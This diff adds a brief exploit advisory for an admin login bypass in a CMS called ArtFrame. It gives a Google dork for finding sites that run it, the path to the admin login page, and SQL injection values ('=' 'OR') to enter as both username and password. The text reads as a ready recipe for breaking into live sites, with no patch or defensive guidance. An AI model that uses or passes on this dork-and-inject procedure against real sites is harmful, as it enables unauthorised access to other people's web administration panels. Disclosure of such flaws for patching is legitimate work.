@@ -1,0 +1,17 @@
+## Admin bypass
+information the exploit
+Exploit Title : ArtFrame CMS Admin Page Bypass
+Homepage : http://ArtFrame.nl
+================================
+Google Dork : intext:"ArtFrame.nl"
+================================
+Tested On : Kali
+
+######################
+# Vulnerable File : index.php
+# Describe : Search dork and select Target. Put achterkant/index.php After url such as :
+# http://site.com/achterkant/index.php
+# Now enter fill Gebruikersnaam(username) and Wachtwoord(Password) like the information below :
+# Gebruikersnaam: '=' 'OR'
+# Wachtwoord: '=' 'OR'
+By MF-PS
